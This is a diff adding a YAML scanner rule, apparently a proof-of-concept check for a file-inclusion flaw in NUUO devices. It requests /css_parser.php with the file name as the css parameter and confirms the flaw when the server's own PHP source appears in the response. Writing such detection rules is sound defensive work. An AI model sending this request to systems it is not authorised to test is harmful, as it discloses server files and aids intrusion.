@@ -1,0 +1,6 @@
+name: poc-NUUO-FileInclusion
+rules:
+  - method: GET
+    path: /css_parser.php?css=css_parser.php
+    follow_redirects: false
+    expression: status == 200 && headers['content-type'] == 'text/css' && body.bcontains(b"$_GET['css']")
